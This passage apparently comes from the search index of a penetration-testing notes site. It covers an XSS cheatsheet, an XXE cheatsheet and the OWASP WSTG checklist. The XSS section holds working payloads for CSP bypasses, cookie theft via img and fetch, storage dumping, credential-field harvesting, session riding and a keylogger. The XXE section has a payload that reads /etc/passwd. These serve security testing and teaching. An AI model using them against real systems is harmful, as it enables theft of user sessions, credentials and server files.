Injection"],"tags":["xpath","injection"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/","level":1,"title":"XSS Cheatsheet","text":"","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#checklist","level":2,"title":"Checklist","text":"<ul> <li> Enter unique string in every input field - check where it's being reflected in the DOM</li> <li> Check input in GET and POST requests</li> <li> Be sure to check the context in which it's reflected<ul> <li>input</li> <li>textarea</li> <li>JS</li> <li>HTML attribute</li> <li>title</li> <li>style</li> <li>etc.</li> </ul> </li> <li> It may be reflected somewhere that isn't visible on the screen</li> <li> Try to escape the context where input is reflected<ul> <li>Example:     <code>?color=%23FFFFFe;}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li> <li>Injecting into JavaScript context example: <code>;alert(1);//</code></li> <li>If this doesn't work, try adding another attribute to the tag where input is reflected.</li> </ul> </li> <li> Check for filter evasion<ul> <li>Case sensitivity</li> <li>Filtered non-recursively</li> <li>Try different encodings</li> <li>Try leaving off closing bracket</li> </ul> </li> <li> <p> Check content-type</p> <p>Check for APIs</p> <p>This is particularly important for API endpoints</p> <ul> <li>If the content type doesn't match what is actually returned (e.g., text/html with JSON returned from an API), try accessing the endpoint directly and see if HTML injection is possible. </li> </ul> </li> <li> <p> Check for XSS in any markdown input fields</p> <ul> <li>Links are good for this</li> <li>Try different encodings, casing, etc.</li> <li>Try smuggling special characters in...adding new attributes, etc.</li> </ul> </li> <li> Look for areas where input is being stored and served to all users</li> <li> Check for blind XSS<ul> <li>Something that fires on a backend application<ul> <li>Customer service page</li> <li>Shipping page</li> <li>Admin dashboard</li> </ul> </li> <li>What are backend users likely to see? <ul> <li>Service ticket</li> <li>Reporting a post or user</li> <li>etc.</li> </ul> </li> </ul> </li> </ul>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#content-security-policy","level":2,"title":"Content Security Policy","text":"<p>CSP is a secondary protection mechanism that helps protect against XSS, Clickjacking, and other types of attacks. </p>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#csp-bypasses","level":3,"title":"CSP Bypasses","text":"","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#csp-uri-scheme-bypass","level":4,"title":"CSP URI Scheme Bypass","text":"<p>May be able to use something like data.</p> <p>Example:</p> data bypass<pre><code>&lt;script src=data:text/javascript,alert(1)&gt;&lt;/script&gt;\n</code></pre> data bypass in an object tag<pre><code>&lt;object data=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;/object&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#csp-jsonp-bypass","level":4,"title":"CSP JSONP Bypass","text":"<p>JSON with padding.</p> <p>Allows an application to retrieve JSON data from another domain.</p> <p>We can abuse the callback function. Example:</p> YouTube JSONP bypass<pre><code>&lt;script src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=mCn54oGQH0w&amp;callback=alert(1)&gt;&lt;/script&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#csp-upload-bypass","level":4,"title":"CSP Upload Bypass","text":"<p>If we can find a way to upload a script to the same domain, then it will bypass a <code>script-src: self</code> directive. </p> <p>Check if <code>.js</code> files are allowed on any upload form. </p> <p>Example:</p> Example upload CSP bypass<pre><code>Test message&lt;script src=https://z2c8lw3i.eu4.ctfio.com/csp-upload/uploads/ac27121ae671cfeb22e3eb472e0e1997.js&gt;&lt;/script&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#postmessage","level":2,"title":"PostMessage","text":"<p>A way for different browser windows to be able to talk to each other. </p> <ul> <li> Check that postmessage orgin is validated</li> <li> Check for misconfigured regex</li> </ul> <p>Example:</p> Misconfigured regex<pre><code>&lt;script&gt;\n    window.addEventListener(\"message\",function(event){\n        if (event.data.hasOwnProperty('msg')) {\n            if( /(http:|https:)\\/\\/([a-z0-9.]{1,}).ctfio.com/.test( event.origin ) ) {\n                document.getElementById('message').innerHTML = event.data.msg;\n            }else{\n                alert(\"You're not allowed to send from here!\");\n            }\n        }\n    });\n    &lt;/script&gt;\n</code></pre> <p>Note the mistake in the regex. The <code>.</code> character matches any character except for line separators. This allows us to register a domain like eviltestctfio.com that would bypass this check. </p> <p>https://regex101.com</p> <p></p> <p>Additionally, there's nothing to indicate that the <code>ctfio.com</code> is the end of the string, so something like <code>test.ctfio.com.hacker.com</code> would also work.</p>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#payloads","level":2,"title":"Payloads","text":"","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#building-requests","level":3,"title":"Building Requests","text":"XMLHTTP Request<pre><code>let xhr = new XMLHttpRequest()\nxhr.open('GET','http://localhost/endpoint',true)\nxhr.send('email=update@email.com’)\n</code></pre> Fetch API<pre><code>fetch('http://localhost/endpoint’)\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#stealing-cookies","level":3,"title":"Stealing Cookies","text":"Using img src<pre><code>&lt;img src=\"http://localhost?c='+document.cookie+'\" /&gt;\n</code></pre> Using the Fetch API<pre><code>fetch(\"http://localhost?c=\" + document.cookie);\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#accessing-local-session-storage","level":3,"title":"Accessing Local &amp; Session Storage","text":"Local storage<pre><code>let localStorageData = JSON.stringify(localStorage);\n</code></pre> Session storage<pre><code>let sessionStorageData = JSON.stringify(sessionStorage);\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#saved-credentials","level":3,"title":"Saved Credentials","text":"Saved creds<pre><code>// create the input elements\n\nlet usernameField = document.createElement(\"input\");\nusernameField.type = \"text\";\nusernameField.name = \"username\";\nusernameField.id = \"username\";\nlet passwordField = document.createElement(\"input\");\npasswordField.type = \"password\";\npasswordField.name = \"password\";\npasswordField.id = \"password\";\n\n// append the elements to the body of the page\ndocument.body.appendChild(usernameField);\ndocument.body.appendChild(passwordField);\n\n// exfiltrate as needed (we need to wait for the fields to be filled before exfiltrating the information)\nsetTimeout(function () {\n  console.log(\"Username:\", document.getElementById(\"username\").value);\n  console.log(\"Password:\", document.getElementById(\"password\").value);\n}, 1000);\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#session-riding","level":3,"title":"Session Riding","text":"Session riding<pre><code>let xhr = new XMLHttpRequest();\nxhr.open('POST','http://localhost/updateprofile',true);\nxhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');\nxhr.send('email=updated@email.com’);\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xss-cheatsheet/#keylogging","level":3,"title":"Keylogging","text":"JS Keylogger<pre><code>document.onkeypress = function (e) {\n  get = window.event ? event : e;\n  key = get.keyCode ? get.keyCode : get.charCode;\n  key = String.fromCharCode(key);\n  console.log(key);\n};\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XSS Cheatsheet"],"tags":["xss","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xxe-injection/","level":1,"title":"XXE Injection Cheatsheet","text":"<p>XXE is a vulnerability that occurs when an application parses XML input containing a reference to an external entity and the application is using a weakly configured XML parser. </p>","path":["Resources","Methodology","Cheatsheets","XXE Injection Cheatsheet"],"tags":["xxe","injection","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xxe-injection/#checks","level":2,"title":"Checks","text":"<ul> <li> Check for any requests containing XML</li> <li> Are there any uploads that accept docx, xlsx, etc?</li> </ul>","path":["Resources","Methodology","Cheatsheets","XXE Injection Cheatsheet"],"tags":["xxe","injection","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xxe-injection/#sample-payloads","level":2,"title":"Sample payloads","text":"<p>Basic</p> Basic XXE to retrieve file<pre><code>&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;\n</code></pre>","path":["Resources","Methodology","Cheatsheets","XXE Injection Cheatsheet"],"tags":["xxe","injection","cheatsheet"]},{"location":"Resources/Methodology/Cheatsheets/xxe-injection/#references","level":2,"title":"References","text":"<p>PayloadsAllTheThings</p>","path":["Resources","Methodology","Cheatsheets","XXE Injection Cheatsheet"],"tags":["xxe","injection","cheatsheet"]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/","level":1,"title":"OWASP Web Security Testing Guide (WSTG) Checklist","text":"<p>This checklist is based on the OWASP Web Security Testing Guide and provides a comprehensive framework for testing web application security. Each test includes objectives to guide your testing approach.</p>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#information-gathering","level":2,"title":"Information Gathering","text":"<ul> <li> <p> WSTG-INFO-01 - Conduct Search Engine Discovery Reconnaissance for Information Leakage</p> </li> <li> <p>Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's site) or indirectly (via third-party services).</p> </li> <li> <p> WSTG-INFO-02 - Fingerprint Web Server</p> </li> <li> <p>Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.</p> </li> <li> <p> WSTG-INFO-03 - Review Webserver Metafiles for Information Leakage</p> </li> <li> <p>Identify hidden or obfuscated paths and functionality through the analysis of metadata files.</p> </li> <li> <p>Extract and map other information that could lead to a better understanding of the systems at hand.</p> </li> <li> <p> WSTG-INFO-04 - Enumerate Applications on Webserver</p> </li> <li> <p>Enumerate the applications within the scope that exist on a web server.</p> </li> <li> <p> WSTG-INFO-05 - Review Web Page Content for Information Leakage</p> </li> <li> <p>Review web page comments, metadata, and redirect bodies to find any information leakage.</p> </li> <li>Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.</li> <li> <p>Identify if source map files or other frontend debug files exist.</p> </li> <li> <p> WSTG-INFO-06 - Identify Application Entry Points</p> </li> <li> <p>Identify possible entry and injection points through request and response analysis.</p> </li> <li> <p> WSTG-INFO-07 - Map Execution Paths Through Application</p> </li> <li> <p>Map the target application and understand the principal workflows.</p> </li> <li> <p> WSTG-INFO-08 - Fingerprint Web Application Framework</p> </li> <li> <p>Fingerprint the components used by the web applications.</p> </li> <li> <p> WSTG-INFO-09 - Fingerprint Web Application</p> </li> <li> <p> WSTG-INFO-10 - Map Application Architecture</p> </li> <li>Understand the architecture of the application and the technologies in use.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#configuration-and-deployment-management-testing","level":2,"title":"Configuration and Deployment Management Testing","text":"<ul> <li> <p> WSTG-CONF-01 - Test Network Infrastructure Configuration</p> </li> <li> <p>Review the applications' configurations set across the network and validate that they are not vulnerable.</p> </li> <li> <p>Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.</p> </li> <li> <p> WSTG-CONF-02 - Test Application Platform Configuration</p> </li> <li> <p>Ensure that default and known files have been removed.</p> </li> <li>Validate that no debugging code or extensions are left in the production environments.</li> <li> <p>Review the logging mechanisms set in place for the application.</p> </li> <li> <p> WSTG-CONF-03 - Test File Extensions Handling for Sensitive Information</p> </li> <li> <p>Brute force sensitive file extensions that might contain raw data such as scripts, credentials, etc.</p> </li> <li> <p>Validate that no system framework bypasses exist for the rules that have been set.</p> </li> <li> <p> WSTG-CONF-04 - Review Old Backup and Unreferenced Files for Sensitive Information</p> </li> <li> <p>Find and analyse unreferenced files that might contain sensitive information.</p> </li> <li> <p> WSTG-CONF-05 - Enumerate Infrastructure and Application Admin Interfaces</p> </li> <li> <p>Identify hidden administrator interfaces and functionality.</p> </li> <li> <p> WSTG-CONF-06 - Test HTTP Methods</p> </li> <li> <p>Enumerate supported HTTP methods.</p> </li> <li>Test for access control bypass.</li> <li> <p>Test HTTP method overriding techniques.</p> </li> <li> <p> WSTG-CONF-07 - Test HTTP Strict Transport Security</p> </li> <li> <p>Review the HSTS header and its validity.</p> </li> <li> <p> WSTG-CONF-08 - Test RIA Cross Domain Policy</p> </li> <li> <p> WSTG-CONF-09 - Test File Permission</p> </li> <li> <p>Review and identify any rogue file permissions.</p> </li> <li> <p> WSTG-CONF-10 - Test for Subdomain Takeover</p> </li> <li> <p>Enumerate all possible domains (previous and current).</p> </li> <li> <p>Identify any forgotten or misconfigured domains.</p> </li> <li> <p> WSTG-CONF-11 - Test Cloud Storage</p> </li> <li> <p>Assess that the access control configuration for the storage services is properly in place.</p> </li> <li> <p> WSTG-CONF-12 - Testing for Content Security Policy</p> </li> <li> <p>Review the Content-Security-Policy header or meta element to identify misconfigurations.</p> </li> <li> <p> WSTG-CONF-13 - Test Path Confusion</p> </li> <li> <p>Make sure application paths are configured correctly.</p> </li> <li> <p> WSTG-CONF-14 - Test Other HTTP Security Header Misconfigurations</p> </li> <li>Identify improperly configured security headers.</li> <li>Assess the impact of misconfigured security headers.</li> <li>Validate the correct implementation of required security headers.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#identity-management-testing","level":2,"title":"Identity Management Testing","text":"<ul> <li> <p> WSTG-IDNT-01 - Test Role Definitions</p> </li> <li> <p>Identify and document roles used by the application.</p> </li> <li>Attempt to switch, change, or access another role.</li> <li> <p>Review the granularity of the roles and the needs behind the permissions given.</p> </li> <li> <p> WSTG-IDNT-02 - Test User Registration Process</p> </li> <li> <p>Verify that the identity requirements for user registration are aligned with business and security requirements.</p> </li> <li> <p>Validate the registration process.</p> </li> <li> <p> WSTG-IDNT-03 - Test Account Provisioning Process</p> </li> <li> <p>Verify which accounts may provision other accounts and of what type.</p> </li> <li> <p> WSTG-IDNT-04 - Testing for Account Enumeration and Guessable User Account</p> </li> <li> <p>Review processes that pertain to user identification (e.g. registration, login, etc.).</p> </li> <li> <p>Enumerate users where possible through response analysis.</p> </li> <li> <p> WSTG-IDNT-05 - Testing for Weak or Unenforced Username Policy</p> </li> <li>Determine whether a consistent account name structure renders the application vulnerable to account enumeration.</li> <li>Determine whether the application's error messages permit account enumeration.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#authentication-testing","level":2,"title":"Authentication Testing","text":"<ul> <li> <p> WSTG-ATHN-01 - Testing for Credentials Transported over an Encrypted Channel</p> </li> <li> <p> WSTG-ATHN-02 - Testing for Default Credentials</p> </li> <li> <p>Determine whether the application has any user accounts with default passwords.</p> </li> <li> <p>Review whether new user accounts are created with weak or predictable passwords.</p> </li> <li> <p> WSTG-ATHN-03 - Testing for Weak Lock Out Mechanism</p> </li> <li> <p>Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.</p> </li> <li> <p>Evaluate the unlock mechanism's resistance to unauthorized account unlocking.</p> </li> <li> <p> WSTG-ATHN-04 - Testing for Bypassing Authentication Schema</p> </li> <li> <p>Ensure that authentication is applied across all services that require it.</p> </li> <li> <p> WSTG-ATHN-05 - Testing for Vulnerable Remember Password</p> </li> <li> <p>Validate that the generated session is managed securely and do not put the user's credentials in danger.</p> </li> <li> <p> WSTG-ATHN-06 - Testing for Browser Cache Weaknesses</p> </li> <li> <p>Review if the application stores sensitive information on the client-side.</p> </li> <li> <p>Review if access can occur without authorization.</p> </li> <li> <p> WSTG-ATHN-07 - Testing for Weak Authentication Methods</p> </li> <li> <p>Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.</p> </li> <li> <p> WSTG-ATHN-08 - Testing for Weak Security Question Answer</p> </li> <li> <p>Determine the complexity and how straight-forward the questions are.</p> </li> <li> <p>Assess possible user answers and brute force capabilities.</p> </li> <li> <p> WSTG-ATHN-09 - Testing for Weak Password Change or Reset Functionalities</p> </li> <li> <p>Determine whether the password change and reset functionality allows accounts to be compromised.</p> </li> <li> <p> WSTG-ATHN-10 - Testing for Weaker Authentication in Alternative Channel</p> </li> <li> <p>Identify alternative authentication channels.</p> </li> <li> <p>Assess the security measures used and if any bypasses exists on the alternative channels.</p> </li> <li> <p> WSTG-ATHN-11 - Testing Multi-Factor Authentication (MFA)</p> </li> <li>Identify the type of MFA used by the application.</li> <li>Determine whether the MFA implementation is robust and secure.</li> <li>Attempt to bypass the MFA.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#authorization-testing","level":2,"title":"Authorization Testing","text":"<ul> <li> <p> WSTG-ATHZ-01 - Testing Directory Traversal File Include</p> </li> <li> <p>Identify injection points that pertain to path traversal.</p> </li> <li> <p>Assess bypassing techniques and identify the extent of path traversal.</p> </li> <li> <p> WSTG-ATHZ-02 - Testing for Bypassing Authorization Schema</p> </li> <li> <p>Assess if unauthenticated, horizontal, or vertical access is possible.</p> </li> <li> <p> WSTG-ATHZ-03 - Testing for Privilege Escalation</p> </li> <li> <p>Identify injection points related to privilege manipulation.</p> </li> <li> <p>Fuzz or otherwise attempt to bypass security measures.</p> </li> <li> <p> WSTG-ATHZ-04 - Testing for Insecure Direct Object References</p> </li> <li> <p>Identify points where object references may occur.</p> </li> <li> <p>Assess the access control measures and if they're vulnerable to IDOR.</p> </li> <li> <p> WSTG-ATHZ-05 - Testing for OAuth Weaknesses</p> </li> <li>Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#session-management-testing","level":2,"title":"Session Management Testing","text":"<ul> <li> <p> WSTG-SESS-01 - Testing for Session Management Schema</p> </li> <li> <p>Gather session tokens, for the same user and for different users where possible.</p> </li> <li>Analyze and ensure that enough randomness exists to stop session forging attacks.</li> <li> <p>Modify cookies that are not signed and contain information that can be manipulated.</p> </li> <li> <p> WSTG-SESS-02 - Testing for Cookies Attributes</p> </li> <li> <p>Ensure that the proper security configuration is set for cookies.</p> </li> <li> <p> WSTG-SESS-03 - Testing for Session Fixation</p> </li> <li> <p>Analyze the authentication mechanism and its flow.</p> </li> <li> <p>Force cookies and assess the impact.</p> </li> <li> <p> WSTG-SESS-04 - Testing for Exposed Session Variables</p> </li> <li> <p>Ensure that proper encryption is implemented.</p> </li> <li>Review the caching configuration.</li> <li> <p>Assess the channel and methods' security.</p> </li> <li> <p> WSTG-SESS-05 - Testing for Cross Site Request Forgery</p> </li> <li> <p>Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.</p> </li> <li> <p> WSTG-SESS-06 - Testing for Logout Functionality</p> </li> <li> <p>Assess the logout UI.</p> </li> <li> <p>Analyze the session timeout and if the session is properly killed after logout.</p> </li> <li> <p> WSTG-SESS-07 - Testing Session Timeout</p> </li> <li> <p>Validate that a hard session timeout exists.</p> </li> <li> <p> WSTG-SESS-08 - Testing for Session Puzzling</p> </li> <li> <p>Identify all session variables.</p> </li> <li> <p>Break the logical flow of session generation.</p> </li> <li> <p> WSTG-SESS-09 - Testing for Session Hijacking</p> </li> <li> <p>Identify vulnerable session cookies.</p> </li> <li> <p>Hijack vulnerable cookies and assess the risk level.</p> </li> <li> <p> WSTG-SESS-10 - Testing JSON Web Tokens</p> </li> <li> <p>Determine whether the JWTs expose sensitive information.</p> </li> <li> <p>Determine whether the JWTs can be tampered with or modified.</p> </li> <li> <p> WSTG-SESS-11 - Testing for Concurrent Sessions</p> </li> <li>Evaluate the application's session management by assessing the handling of multiple active sessions for a single user account.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#input-validation-testing","level":2,"title":"Input Validation Testing","text":"<ul> <li> <p> WSTG-INPV-01 - Testing for Reflected Cross Site Scripting</p> </li> <li> <p>Identify variables that are reflected in responses.</p> </li> <li> <p>Assess the input they accept and the encoding that gets applied on return (if any).</p> </li> <li> <p> WSTG-INPV-02 - Testing for Stored Cross Site Scripting</p> </li> <li> <p>Identify stored input that is reflected on the client-side.</p> </li> <li> <p>Assess the input they accept and the encoding that gets applied on return (if any).</p> </li> <li> <p> WSTG-INPV-03 - Testing for HTTP Verb Tampering</p> </li> <li> <p> WSTG-INPV-04 - Testing for HTTP Parameter Pollution</p> </li> <li> <p>Identify the backend and the parsing method used.</p> </li> <li> <p>Assess injection points and try bypassing input filters using HPP.</p> </li> <li> <p> WSTG-INPV-05 - Testing for SQL Injection</p> </li> <li> <p>Identify SQL injection points.</p> </li> <li> <p>Assess the severity of the injection and the level of access that can be achieved through it.</p> </li> <li> <p> WSTG-INPV-06 - Testing for LDAP Injection</p> </li> <li> <p>Identify LDAP injection points.</p> </li> <li> <p>Assess the severity of the injection.</p> </li> <li> <p> WSTG-INPV-07 - Testing for XML Injection</p> </li> <li> <p>Identify XML injection points.</p> </li> <li> <p>Assess the types of exploits that can be attained and their severities.</p> </li> <li> <p> WSTG-INPV-08 - Testing for SSI Injection</p> </li> <li> <p>Identify SSI injection points.</p> </li> <li> <p>Assess the severity of the injection.</p> </li> <li> <p> WSTG-INPV-09 - Testing for XPath Injection</p> </li> <li> <p>Identify XPATH injection points.</p> </li> <li> <p> WSTG-INPV-10 - Testing for IMAP SMTP Injection</p> </li> <li> <p>Identify IMAP/SMTP injection points.</p> </li> <li>Understand the data flow and deployment structure of the system.</li> <li> <p>Assess the injection impacts.</p> </li> <li> <p> WSTG-INPV-11 - Testing for Code Injection</p> </li> <li> <p>Identify injection points where you can inject code into the application.</p> </li> <li> <p>Assess the injection severity.</p> </li> <li> <p> WSTG-INPV-12 - Testing for Command Injection</p> </li> <li> <p>Identify and assess the command injection points.</p> </li> <li> <p> WSTG-INPV-13 - Testing for Buffer Overflow</p> </li> <li> <p> WSTG-INPV-13 - Testing for Format String Injection</p> </li> <li> <p>Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.</p> </li> <li> <p> WSTG-INPV-14 - Testing for Incubated Vulnerability</p> </li> <li> <p>Identify injections that are stored and require a recall step to the stored injection.</p> </li> <li>Understand how a recall step could occur.</li> <li> <p>Set listeners or activate the recall step if possible.</p> </li> <li> <p> WSTG-INPV-15 - Testing for HTTP Splitting Smuggling</p> </li> <li> <p>Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.</p> </li> <li> <p>Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.</p> </li> <li> <p> WSTG-INPV-16 - Testing for HTTP Incoming Requests</p> </li> <li> <p>Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.</p> </li> <li> <p>Monitor HTTP traffic without changes of end user Browser proxy or client-side application.</p> </li> <li> <p> WSTG-INPV-17 - Testing for Host Header Injection</p> </li> <li> <p>Assess if the Host header is being parsed dynamically in the application.</p> </li> <li> <p>Bypass security controls that rely on the header.</p> </li> <li> <p> WSTG-INPV-18 - Testing for Server-side Template Injection</p> </li> <li> <p>Detect template injection vulnerability points.</p> </li> <li>Identify the templating engine.</li> <li> <p>Build the exploit.</p> </li> <li> <p> WSTG-INPV-19 - Testing for Server-Side Request Forgery</p> </li> <li> <p>Identify SSRF injection points.</p> </li> <li>Test if the injection points are exploitable.</li> <li> <p>Asses the severity of the vulnerability.</p> </li> <li> <p> WSTG-INPV-20 - Testing for Mass Assignment</p> </li> <li>Identify requests that modify objects</li> <li>Assess if it is possible to modify fields never intended to be modified from outside</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#testing-for-error-handling","level":2,"title":"Testing for Error Handling","text":"<ul> <li> <p> WSTG-ERRH-01 - Testing for Improper Error Handling</p> </li> <li> <p>Identify existing error output.</p> </li> <li> <p>Analyze the different output returned.</p> </li> <li> <p> WSTG-ERRH-02 - Testing for Stack Traces</p> </li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#testing-for-weak-cryptography","level":2,"title":"Testing for Weak Cryptography","text":"<ul> <li> <p> WSTG-CRYP-01 - Testing for Weak Transport Layer Security</p> </li> <li> <p>Validate the service configuration.</p> </li> <li>Review the digital certificate's cryptographic strength and validity.</li> <li> <p>Ensure that the TLS security is not bypassable and is properly implemented across the application.</p> </li> <li> <p> WSTG-CRYP-02 - Testing for Padding Oracle</p> </li> <li> <p>Identify encrypted messages that rely on padding.</p> </li> <li> <p>Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.</p> </li> <li> <p> WSTG-CRYP-03 - Testing for Sensitive Information Sent via Unencrypted Channels</p> </li> <li> <p>Identify sensitive information transmitted through the various channels.</p> </li> <li> <p>Assess the privacy and security of the channels used.</p> </li> <li> <p> WSTG-CRYP-04 - Testing for Weak Encryption</p> </li> <li>Provide a guideline for the identification weak encryption or hashing uses and implementations.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#business-logic-testing","level":2,"title":"Business Logic Testing","text":"<ul> <li> <p> WSTG-BUSL-01 - Test Business Logic Data Validation</p> </li> <li> <p>Identify data injection points.</p> </li> <li>Validate that all checks are occurring on the backend and can't be bypassed.</li> <li> <p>Attempt to break the format of the expected data and analyze how the application is handling it.</p> </li> <li> <p> WSTG-BUSL-02 - Test Ability to Forge Requests</p> </li> <li> <p>Review the project documentation looking for guessable, predictable, or hidden functionality of fields.</p> </li> <li> <p>Insert logically valid data in order to bypass normal business logic workflow.</p> </li> <li> <p> WSTG-BUSL-03 - Test Integrity Checks</p> </li> <li> <p>Review the project documentation for components of the system that move, store, or handle data.</p> </li> <li>Determine what type of data is logically acceptable by the component and what types the system should guard against.</li> <li>Determine who should be allowed to modify or read that data in each component.</li> <li> <p>Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.</p> </li> <li> <p> WSTG-BUSL-04 - Test for Process Timing</p> </li> <li> <p>Review the project documentation for system functionality that may be impacted by time.</p> </li> <li> <p>Develop and execute misuse cases.</p> </li> <li> <p> WSTG-BUSL-05 - Test Number of Times a Function Can Be Used Limits</p> </li> <li> <p>Identify functions that must set limits to the times they can be called.</p> </li> <li> <p>Assess if there is a logical limit set on the functions and if it is properly validated.</p> </li> <li> <p> WSTG-BUSL-06 - Testing for the Circumvention of Work Flows</p> </li> <li> <p>Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.</p> </li> <li> <p>Develop a misuse case and try to circumvent every logic flow identified.</p> </li> <li> <p> WSTG-BUSL-07 - Test Defenses Against Application Misuse</p> </li> <li> <p>Generate notes from all tests conducted against the system.</p> </li> <li>Review which tests had a different functionality based on aggressive input.</li> <li> <p>Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.</p> </li> <li> <p> WSTG-BUSL-08 - Test Upload of Unexpected File Types</p> </li> <li> <p>Review the project documentation for file types that are rejected by the system.</p> </li> <li>Verify that the unwelcomed file types are rejected and handled safely.</li> <li> <p>Verify that file batch uploads are secure and do not allow any bypass against the set security measures.</p> </li> <li> <p> WSTG-BUSL-09 - Test Upload of Malicious Files</p> </li> <li> <p>Identify the file upload functionality.</p> </li> <li>Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.</li> <li>If documentation is not available then consider what would be appropriate based on the purpose of the application.</li> <li>Determine how the uploaded files are processed.</li> <li>Obtain or create a set of malicious files for testing.</li> <li> <p>Try to upload the malicious files to the application and determine whether it is accepted and processed.</p> </li> <li> <p> WSTG-BUSL-10 - Test Payment Functionality</p> </li> <li>Determine whether the business logic for the e-commerce functionality is robust.</li> <li>Understand how the payment functionality works.</li> <li>Determine whether the payment functionality is secure.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#client-side-testing","level":2,"title":"Client-side Testing","text":"<ul> <li> <p> WSTG-CLNT-01 - Testing for DOM-Based Cross Site 